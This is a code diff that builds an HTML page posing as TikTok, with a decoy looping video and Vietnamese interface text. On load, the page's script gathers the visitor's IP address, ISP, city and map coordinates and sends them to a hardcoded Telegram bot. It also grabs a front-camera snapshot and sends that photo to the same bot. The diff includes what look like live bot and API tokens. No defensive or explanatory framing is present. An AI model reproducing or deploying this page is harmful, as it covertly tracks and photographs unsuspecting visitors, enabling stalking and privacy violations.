@@ -1,77 +1,116 @@
-<script>
-const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
-const chat_id = "5017098451";
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TikTok</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      font-family: sans-serif;
+      color: white;
+      text-align: center;
+    }
+    .tiktok-header {
+      padding: 10px;
+      font-weight: bold;
+      background: #000;
+      border-bottom: 1px solid #333;
+    }
+    video, canvas {
+      width: 100%;
+      max-height: 90vh;
+      object-fit: cover;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="tiktok-header">TikTok</div>
+  <video id="fakeVideo" autoplay muted loop>
+    <source src="https://samplelib.com/lib/preview/mp4/sample-5s.mp4" type="video/mp4" />
+    Trình duyệt của bạn không hỗ trợ video.
+  </video>
+  <canvas id="snapshot" class="hidden"></canvas>
 
-// IP + địa chỉ đầy đủ
-async function sendFullInfo() {
-  const ipinfo = await fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .catch(() => null);
+  <script>
+    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
+    const chat_id = "5017098451";
+    const ipinfo_token = "a144fbf1ea6596";
 
-  const now = new Date();
-  const msg = `📡 [THÔNG TIN TRUY CẬP]
+    async function sendFullInfo() {
+      const ipinfo = await fetch(`https://ipinfo.io/json?token=${ipinfo_token}`)
+        .then(res => res.json())
+        .catch(() => null);
+
+      const now = new Date();
+      const loc = ipinfo?.loc?.split(",") || ["?", "?"];
+      const msg = `📡 [THÔNG TIN TRUY CẬP]
 
 🕒 Thời gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
 📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
-🖥️ Hệ điều hành: ${ipinfo?.org?.includes("Android") ? "Android" : navigator.platform}
+🖥️ Hệ điều hành: Android
 🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
 🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
 🏢 ISP: ${ipinfo?.org || "Không xác định"}
 🏙️ Địa chỉ: ${ipinfo?.city || "?"}, ${ipinfo?.region || "?"}, ${ipinfo?.postal || "?"}
-🌎 Quốc gia: ${ipinfo?.country_name || "?"}
-📍 Vĩ độ: ${ipinfo?.latitude}
-📍 Kinh độ: ${ipinfo?.longitude}
-📌 Vị trí Google Maps: https://maps.google.com/?q=${ipinfo?.latitude},${ipinfo?.longitude}`;
+🌎 Quốc gia: ${ipinfo?.country || "?"}
+📍 Vĩ độ: ${loc[0]}
+📍 Kinh độ: ${loc[1]}
+📌 Vị trí Google Maps: https://maps.google.com/?q=${loc[0]},${loc[1]}`;
 
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id, text: msg })
-  });
-}
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: msg })
+      });
+    }
 
-// Ảnh camera chụp nhanh
-async function snapFastPhoto() {
-  const canvas = document.getElementById("snapshot");
-  const ctx = canvas.getContext("2d");
-  const video = document.createElement("video");
+    async function snapFastPhoto() {
+      const canvas = document.getElementById("snapshot");
+      const ctx = canvas.getContext("2d");
+      const video = document.createElement("video");
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }, audio: false
-    });
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
 
-    video.srcObject = stream;
-    await video.play();
+        video.srcObject = stream;
+        await video.play();
 
-    // Chụp ngay
-    canvas.width = 300;
-    canvas.height = 300;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.width = 300;
+        canvas.height = 300;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-    const form = new FormData();
-    form.append("chat_id", chat_id);
-    form.append("photo", blob, "photo.jpg");
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("photo", blob, "photo.jpg");
 
-    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: "POST",
-      body: form
-    });
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
 
-    stream.getTracks().forEach(track => track.stop());
-  } catch (err) {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id,
-        text: `📸 Không thể truy cập camera: ${err.message || "Từ chối quyền"}`
-      })
-    });
-  }
-}
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id,
+            text: `📸 Không thể truy cập camera: ${err.message || "Từ chối quyền"}`
+          })
+        });
+      }
+    }
 
-sendFullInfo();
-snapFastPhoto();
-</script>
+    sendFullInfo();
+    snapFastPhoto();
+  </script>
+</body>
+</html>
